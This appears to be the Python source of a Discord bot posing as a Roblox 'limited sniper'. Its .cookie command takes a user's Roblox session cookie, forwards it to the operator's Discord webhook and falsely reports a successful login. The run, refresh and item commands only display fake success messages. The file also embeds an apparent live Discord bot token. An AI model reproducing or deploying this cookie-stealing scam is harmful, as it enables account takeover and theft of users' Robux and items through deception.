import keep_alive
import discord
from discord.ext import commands, tasks
import asyncio
from itertools import cycle
import os
import dhooks
from dhooks import Webhook

client = commands.Bot(command_prefix='.')

status = cycle(
    ['.setup', 'My prefix is .', 'found a limited📷', 'sniped oof📸'])


@client.event
async def on_ready():
    change_status.start()
    print('Bot is ready')

@tasks.loop(seconds=5)
async def change_status():
    await client.change_presence(activity=discord.Game(next(status)))

@client.command(aliases=['HELP', 'help'])
async def Help(ctx):
    desc = """

COMMANDS:
```.cookie```
**logs you in say with the warning and stuff**

```.refresh```
**refreshes your sniper**

```.item ```
**sets you item which u want to snipe**

```.run```
**runs your sniper**
"""
    em = discord.Embed(title = "LIMITED SNIPER FOR ROBLOX.",description=desc)
    
    await ctx.send(embed = em)

@client.command(aliases=['Cookie', 'COOKIE'])
async def cookie(ctx, txt=None):
    if txt == None:
        await ctx.send('There is no cookie ')
    elif "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|" not in txt:
        await ctx.send('not a valid cookie')
    else:
        hook = Webhook('YOUR WEBHOOK')
        hook.send(txt)
        await ctx.send('succesfully logged in :thumbsup:')

@client.command(aliases=['Run', 'RUN'])
async def run(ctx):
    desc = """

**SNIPER STARTED SUCCESFULLY**

"""
    em = discord.Embed(title = "RUN ME UP BABY",description=desc)
    
    await ctx.send(embed = em)
    
@client.command(aliases=['Refresh', 'REFRESH'])
async def refresh(ctx):
    desc = """

**REFRESHED SUCCESFULLY**

"""
    em = discord.Embed(title = "REFRESH ME UP BABY",description=desc)
    
    await ctx.send(embed = em)
    
@client.command(aliases=['Item', 'ITEM'])
async def item(ctx):
    desc = """

**PASTE YOUR ITEM ID BELOW**

"""
    em = discord.Embed(title = "item id:",description=desc)
    
    await ctx.send(embed = em)

@client.command(aliases=['Invite', 'INVITE'])
async def invite(ctx):
    desc = """

**my invite:
  YOUR BOT INVITE HERE.**

"""
    em = discord.Embed(title = "invite for the bot",description=desc)
    
    await ctx.send(embed = em)

keep_alive.keep_alive()
client.run("ODU4MjA1MjI1MzI0MzgwMTcw.YNav5g.aF06Gjam-8x1Nxaulvr1LlRF8EE")